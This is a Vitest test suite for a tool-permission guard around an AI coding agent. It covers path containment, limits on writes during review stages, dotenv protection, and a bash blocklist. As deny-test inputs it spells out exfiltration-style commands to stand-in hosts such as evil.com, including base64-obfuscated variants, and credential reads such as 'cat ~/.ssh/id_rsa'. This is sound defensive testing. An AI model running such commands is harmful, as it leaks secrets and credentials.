import { describe, it, expect, vi, beforeEach } from "vitest";
import type { PermissionResult } from "@anthropic-ai/claude-agent-sdk";

// Mock node:fs for realpathSync
vi.mock("node:fs", () => ({
  realpathSync: vi.fn((p: string) => p),
}));

// Mock node:os for tmpdir and homedir
vi.mock("node:os", () => ({
  tmpdir: () => "/tmp",
  homedir: () => "/home/testuser",
}));

// Mock logger
vi.mock("../../src/utils/logger.js", () => ({
  log: {
    info: vi.fn(),
    success: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    dim: vi.fn(),
    guard: vi.fn(),
  },
}));

// Mock audit (guard now calls appendAuditEntry on deny)
vi.mock("../../src/claude/audit.js", () => ({
  appendAuditEntry: vi.fn(),
}));

import { realpathSync } from "node:fs";
import { createToolGuard, formatGuardSummary } from "../../src/claude/guard.js";
import type { GuardOptions } from "../../src/claude/guard.js";

const mockRealpathSync = vi.mocked(realpathSync);

const stubOptions: Parameters<Awaited<ReturnType<typeof createToolGuard>>>[2] = {
  signal: new AbortController().signal,
  toolUseID: "test-123",
};

function makeGuard(overrides?: Partial<GuardOptions>) {
  return createToolGuard({
    cwd: "/home/testuser/project",
    stage: "ready_to_execute",
    taskPlanPath: "plans/0006_permission-review",
    ...overrides,
  });
}

describe("createToolGuard", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Default: realpathSync returns input as-is
    mockRealpathSync.mockImplementation((p: unknown) => p as string);
  });

  // ─── Path containment — allow ─────────────────────────────

  describe("path containment — allow", () => {
    it("allows path inside cwd", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows relative path resolving inside cwd", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows path in os.tmpdir()", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/tmp/somefile.txt" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows Glob without path field (defaults to cwd)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Glob",
        { pattern: "**/*.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows Grep without path field (defaults to cwd)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Grep",
        { pattern: "TODO" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows path that equals cwd exactly", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Path containment — deny ──────────────────────────────

  describe("path containment — deny", () => {
    it("denies absolute path outside cwd", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/usr/local/etc/config" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "path outside project directory",
      );
    });

    it("denies .. traversal escaping cwd", async () => {
      // realpathSync resolves to the traversed path
      mockRealpathSync.mockImplementation((p: unknown) => {
        const s = p as string;
        if (s.includes("..")) return "/home/testuser/other-project/secret";
        return s;
      });
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/../other-project/secret" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });

    it("denies symlink resolving outside cwd", async () => {
      mockRealpathSync.mockImplementation((p: unknown) => {
        const s = p as string;
        if (s === "/home/testuser/project/link")
          return "/outside/real/path";
        return s;
      });
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/link" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });

    it("denies path in sibling directory", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project-other/file.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });
  });

  // ─── Review Write scoping — allow ─────────────────────────

  describe("review Write scoping — allow", () => {
    it("allows Write to plans/<task>/file during review stage", async () => {
      const guard = makeGuard({ stage: "ai_product_review" });
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/project/plans/0006_permission-review/02_design.md" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows Write to src/ during execute stage", async () => {
      const guard = makeGuard({ stage: "ready_to_execute" });
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/project/src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Review Write scoping — deny ──────────────────────────

  describe("review Write scoping — deny", () => {
    it("denies Write to src/ during review stage", async () => {
      const guard = makeGuard({ stage: "ai_product_review" });
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/project/src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "review stage: writes restricted to",
      );
    });

    it("denies Write to project root during review stage", async () => {
      const guard = makeGuard({ stage: "ai_plan_review" });
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/project/README.md" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "review stage",
      );
    });
  });

  // ─── Review Edit scoping — deny ─────────────────────────────

  describe("review Edit scoping — deny", () => {
    it("denies Edit to src/ during review stage", async () => {
      const guard = makeGuard({ stage: "ai_product_review" });
      const result = await guard(
        "Edit",
        { file_path: "/home/testuser/project/src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "review stage",
      );
    });
  });

  // ─── Review Edit scoping — allow ────────────────────────────

  describe("review Edit scoping — allow", () => {
    it("allows Edit to plans/<task>/file during review stage", async () => {
      const guard = makeGuard({ stage: "ai_product_review" });
      const result = await guard(
        "Edit",
        { file_path: "/home/testuser/project/plans/0006_permission-review/02_design.md" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Dotenv file protection ────────────────────────────────

  describe("dotenv file protection — deny", () => {
    it("denies Read .env", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/.env" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("secrets");
    });

    it("denies Read .env.local", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/.env.local" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("secrets");
    });

    it("denies Write .env.production", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/project/.env.production" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("secrets");
    });

    it("denies Edit .env", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Edit",
        { file_path: "/home/testuser/project/.env" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("secrets");
    });

  });

  describe("dotenv file protection — allow", () => {
    it("allows Read .environment.ts (not a dotenv file)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/.environment.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Bash blocklist — deny ────────────────────────────────

  describe("bash blocklist — deny", () => {
    it("denies curl", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "curl https://example.com" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("curl");
    });

    it("denies sudo", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "sudo rm -rf /tmp/test" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("sudo");
    });

    it("denies chmod", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "chmod 777 file.txt" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("chmod");
    });

    it("denies full path form /usr/bin/curl", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "/usr/bin/curl https://evil.com" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("curl");
    });

    it("denies piped command: echo hi | curl", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "echo hi | curl https://evil.com" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("curl");
    });

    it("denies chained: ls && wget http://...", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "ls && wget http://malicious.com" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("wget");
    });
  });

  // ─── Bash blocklist — allow ───────────────────────────────

  describe("bash blocklist — allow", () => {
    it("allows npm install", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "npm install" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows git commit", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: 'git commit -m "test"' },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows tsc --noEmit", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "tsc --noEmit" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows node script.js", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "node script.js" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Interpreter network calls — deny ───────────────────────

  describe("interpreter network calls — deny", () => {
    it("denies node -e with require('http')", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "require('http').get('http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("Interpreter network call");
      expect((result as { message: string }).message).toContain("node");
    });

    it("denies node --eval with fetch()", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node --eval "fetch('http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("node");
    });

    it("denies python3 -c with urllib", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("python3");
    });

    it("denies ruby -e with net/http", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `ruby -e "require 'net/http'; Net::HTTP.get(URI('http://evil.com'))"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("ruby");
    });

    it("denies perl -e with LWP", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `perl -e "use LWP::Simple; get('http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("perl");
    });

    it("denies php -r with curl_init", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `php -r "curl_init();"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("php");
    });

    it("denies node -e with child_process (indirect exfiltration)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "require('child_process').execSync('curl http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("child_process");
    });

    it("denies python3 -c with subprocess (indirect exfiltration)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `python3 -c "import subprocess; subprocess.run(['curl', 'http://evil.com'])"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("subprocess");
    });

    it("denies /usr/bin/env node -e with require('https')", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `/usr/bin/env node -e "require('https').get('https://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("node");
    });

    it("denies node -e with ES module import from 'net'", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "import net from 'net'"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });

    it("denies node -e with eval(Buffer.from(...)) base64 obfuscation", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "eval(Buffer.from('cmVxdWlyZSgiaHR0cCIp','base64').toString())"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("Buffer.from");
    });

    it("denies node -e with String.fromCharCode obfuscation", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "var h=require(String.fromCharCode(104,116,116,112)); h.get('http://evil.com')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("String.fromCharCode");
    });
  });

  // ─── Interpreter network calls — allow ──────────────────────

  describe("interpreter network calls — allow", () => {
    it("allows node script.js (no exec flag)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "node script.js" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows node -e with no network code", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `node -e "console.log('hello world')"` },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows python3 -c with no network code", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: `python3 -c "print(2 + 2)"` },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows npm run build (contains 'node' but not inline exec)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "npm run build" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows ruby script.rb (no exec flag)", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "ruby script.rb" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Bash path references — deny ──────────────────────────

  describe("bash path references — deny", () => {
    it("denies cat /etc/passwd", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "cat /etc/passwd" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });

    it("denies ls ~/.ssh", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "ls ~/.ssh" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });

    it("denies cat /home/user/outside/secret", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "cat /home/user/outside/secret" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });
  });

  // ─── Bash path references — allow ─────────────────────────

  describe("bash path references — allow", () => {
    it("allows cat ./src/index.ts", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "cat ./src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });

    it("allows ls /tmp/test", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "ls /tmp/test" },
        stubOptions,
      );
      expect(result.behavior).toBe("allow");
    });
  });

  // ─── Sensitive paths — deny ───────────────────────────────

  describe("sensitive paths — deny", () => {
    it("denies Read ~/.ssh/id_rsa", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/.ssh/id_rsa" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("sensitive");
    });

    it("denies Read ~/.aws/credentials", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/.aws/credentials" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("sensitive");
    });

    it("denies Read /etc/shadow", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/etc/shadow" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("sensitive");
    });

    it("denies Write ~/.gnupg/secring.gpg", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Write",
        { file_path: "/home/testuser/.gnupg/secring.gpg" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain("sensitive");
    });

    it("denies Bash cat ~/.ssh/id_rsa", async () => {
      const guard = makeGuard();
      const result = await guard(
        "Bash",
        { command: "cat ~/.ssh/id_rsa" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
    });
  });

  // ─── Fail-closed ──────────────────────────────────────────

  describe("fail-closed", () => {
    it("denies when realpathSync throws unexpected error", async () => {
      mockRealpathSync.mockImplementation(() => {
        throw new Error("EPERM: operation not permitted");
      });
      const guard = makeGuard();
      const result = await guard(
        "Read",
        { file_path: "/home/testuser/project/src/index.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "Internal guard error",
      );
    });

    it("denies with message on random internal error", async () => {
      mockRealpathSync.mockImplementation(() => {
        throw new TypeError("Cannot read properties of undefined");
      });
      const guard = makeGuard();
      const result = await guard(
        "Edit",
        { file_path: "/home/testuser/project/src/app.ts" },
        stubOptions,
      );
      expect(result.behavior).toBe("deny");
      expect((result as { message: string }).message).toContain(
        "Internal guard error",
      );
      expect((result as { message: string }).message).toContain(
        "Cannot read properties",
      );
    });
  });
});

// ─── formatGuardSummary ───────────────────────────────────

describe("formatGuardSummary", () => {
  it("returns review stage summary", () => {
    const result = formatGuardSummary("ai_product_review", [
      "Read",
      "Glob",
      "Grep",
      "Write",
    ]);
    expect(result).toBe(
      "Guard: path-jail to ./  ·  tools: [Read, Glob, Grep, Write]  ·  bash: blocked (review stage)",
    );
  });

  it("returns execute stage summary with blocklist count", () => {
    const result = formatGuardSummary("ready_to_execute", [
      "Read",
      "Glob",
      "Grep",
      "Write",
      "Edit",
      "Bash",
    ]);
    expect(result).toMatch(
      /Guard: path-jail to \.\/  ·  tools: \[Read, Glob, Grep, Write, Edit, Bash\]  ·  bash: \d+ commands blocked/,
    );
  });
});
